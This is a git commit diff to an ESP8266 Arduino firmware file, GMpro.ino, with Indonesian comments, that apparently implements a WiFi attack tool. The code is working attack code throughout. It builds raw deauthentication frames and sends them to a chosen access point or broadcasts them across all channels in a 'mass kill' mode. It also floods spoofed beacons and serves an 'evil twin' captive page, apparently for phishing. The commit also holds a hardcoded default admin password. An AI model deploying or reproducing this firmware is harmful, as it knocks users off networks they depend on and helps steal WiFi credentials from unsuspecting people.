4ddde35c4db555722d24a805eceb592c2bfad8de
bne24747-hash <bne24747@gmail.com>
2026-02-14 07:45:40 +0800

    Update GMpro.ino

--- GMpro.ino
+++ GMpro.ino
@@ -6,7 +6,10 @@
 #include <Adafruit_SSD1306.h>
 #include "web_index.h"
 
-extern "C" { #include "user_interface.h" }
+// FIX: Penulisan extern "C" dipisah agar compiler GitHub tidak bingung
+extern "C" {
+  #include "user_interface.h"
+}
 
 Adafruit_SSD1306 display(64, 48, &Wire, -1);
 ESP8266WebServer server(80);
@@ -18,37 +21,38 @@ bool isMassKill=false, isDeauth=false, isSpam=false, isEvil=false;
 String targetBSSID="", targetSSID="";
 int targetCh=1, currentCh=1, beaconAmount=10;
 
-// Template paket Deauth
 uint8_t deauthPkt[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0x00,0x00,0x01,0x00};
 
-// --- FUNGSI MESIN BEACON SPAM ---
 void sendBeacon(String ssid) {
   uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x31, 0x00, 0x00, (uint8_t)ssid.length() };
   int pos = 38;
   for (int i = 0; i < (int)ssid.length(); i++) packet[pos++] = ssid[i];
-  uint8_t post[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, (uint8_t)WiFi.channel() };
+  uint8_t post[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, (uint8_t)targetCh };
   for (int i = 0; i < (int)sizeof(post); i++) packet[pos++] = post[i];
   wifi_send_pkt_freedom(packet, pos, 0);
 }
 
 void loadCfg() {
   File f = SPIFFS.open("/cfg.txt", "r");
-  if(f) { adminSSID = f.readStringUntil('\n'); adminSSID.trim(); adminPW = f.readStringUntil('\n'); adminPW.trim(); f.close(); }
-  else { adminSSID = "GMpro"; adminPW = "Sangkur87"; }
+  if(f) { 
+    adminSSID = f.readStringUntil('\n'); adminSSID.trim(); 
+    adminPW = f.readStringUntil('\n'); adminPW.trim(); 
+    f.close(); 
+  } else { adminSSID = "GMpro"; adminPW = "Sangkur87"; }
 }
 
-// Convert MAC String ke Hex Byte
 void parseBytes(const char* str, char sep, uint8_t* bytes, int maxBytes, int base) {
-    for (int i = 0; i < maxBytes; i++) {
-        bytes[i] = strtoul(str, NULL, base);
-        str = strchr(str, sep);
-        if (str == NULL || *str == '\0') break;
-        str++;
-    }
+  for (int i = 0; i < maxBytes; i++) {
+    bytes[i] = strtoul(str, NULL, base);
+    str = strchr(str, sep);
+    if (str == NULL || *str == '\0') break;
+    str++;
+  }
 }
 
 void setup() {
-  SPIFFS.begin(); loadCfg();
+  SPIFFS.begin(); 
+  loadCfg();
   display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
   WiFi.mode(WIFI_AP_STA);
   WiFi.softAP(adminSSID.c_str(), adminPW.c_str());
@@ -69,8 +73,8 @@ void setup() {
 
   server.on("/select", [](){
     targetBSSID = server.arg("b"); targetCh = server.arg("c").toInt(); targetSSID = server.arg("s");
-    parseBytes(targetBSSID.c_str(), ':', &deauthPkt[10], 6, 16); // Source MAC
-    parseBytes(targetBSSID.c_str(), ':', &deauthPkt[16], 6, 16); // BSSID
+    parseBytes(targetBSSID.c_str(), ':', &deauthPkt[10], 6, 16); 
+    parseBytes(targetBSSID.c_str(), ':', &deauthPkt[16], 6, 16); 
     server.send(200, "text/plain", "OK");
   });
 
@@ -92,11 +96,19 @@ void setup() {
     else if(u.status == UPLOAD_FILE_END) fsUploadFile.close();
   });
 
+  server.on("/config", [](){
+    File f = SPIFFS.open("/cfg.txt", "w"); f.println(server.arg("s")); f.println(server.arg("p")); f.close();
+    server.send(200); delay(1000); ESP.restart();
+  });
+
+  server.on("/setspam", [](){ beaconAmount = server.arg("n").toInt(); server.send(200); });
+
   server.onNotFound([](){
     if (isEvil) {
       File f = SPIFFS.open("/etwin1.html", "r");
-      if (f) { server.streamFile(f, "text/html"); f.close(); }
-    } else { server.send(404, "text/plain", "Not Found"); }
+      if (f) { server.streamFile(f, "text/html"); f.close(); return; }
+    }
+    server.send(404, "text/plain", "Not Found");
   });
 
   server.begin();
@@ -106,33 +118,27 @@ void setup() {
 void loop() {
   dnsServer.processNextRequest();
   server.handleClient();
-  
   unsigned long now = millis();
   static unsigned long lastAtk = 0;
 
-  if (now - lastAtk > 50) { // Tick rate lebih kencang
+  if (now - lastAtk > 50) {
     lastAtk = now;
-    
     if (isMassKill) {
       currentCh = (currentCh % 13) + 1;
       wifi_set_channel(currentCh);
       uint8_t brc[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-      memcpy(&deauthPkt[4], brc, 6); // Set Destination to Broadcast
+      memcpy(&deauthPkt[4], brc, 6);
       wifi_send_pkt_freedom(deauthPkt, 26, 0);
       packetLog += "[MASS] Kill Ch:" + String(currentCh) + "<br>";
     }
-
     if (isDeauth && targetBSSID != "") {
       wifi_set_channel(targetCh);
       for(int i=0; i<5; i++) wifi_send_pkt_freedom(deauthPkt, 26, 0);
       packetLog += "<span style='color:red'>[TGT] Kill -> " + targetSSID + "</span><br>";
     }
-    
     if (isSpam && targetSSID != "") {
       wifi_set_channel(targetCh);
-      for(int i=0; i < beaconAmount; i++) {
-        sendBeacon(targetSSID + " " + String(i));
-      }
+      for(int i=0; i < beaconAmount; i++) { sendBeacon(targetSSID + " " + String(i)); }
     }
   }
 
